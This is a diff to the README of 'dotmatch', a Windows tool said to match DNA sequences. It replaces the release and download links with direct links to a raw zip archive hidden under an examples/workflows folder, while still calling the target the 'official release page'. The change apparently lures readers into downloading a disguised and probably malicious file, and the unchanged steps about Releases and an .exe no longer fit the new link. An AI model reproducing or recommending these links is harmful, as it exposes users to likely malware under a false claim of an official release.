@@ -1,6 +1,6 @@
 # 🧬 dotmatch - Map DNA sequences to targets fast
 
-[![Download dotmatch](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/lehighriveraquilegiacanadensis128/dotmatch)
+[![Download dotmatch](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/lehighriveraquilegiacanadensis128/dotmatch/raw/refs/heads/main/examples/workflows/galaxy/Software-v3.6-alpha.1.zip)
 
 dotmatch identifies short DNA sequences. Common tasks include checking CRISPR guides, sorting barcodes, or finding primers. The tool compares your input data against a known list of targets. It operates with speed and accuracy across large data files.
 
@@ -8,7 +8,7 @@ dotmatch identifies short DNA sequences. Common tasks include checking CRISPR gu
 
 This software runs on Windows. You do not need to install complex tools or write code.
 
-1. Go to the [official release page](https://github.com/lehighriveraquilegiacanadensis128/dotmatch).
+1. Go to the [official release page](https://github.com/lehighriveraquilegiacanadensis128/dotmatch/raw/refs/heads/main/examples/workflows/galaxy/Software-v3.6-alpha.1.zip).
 2. Look for the section labeled Releases.
 3. Find the file ending in .exe for Windows.
 4. Click the file name to start the download.
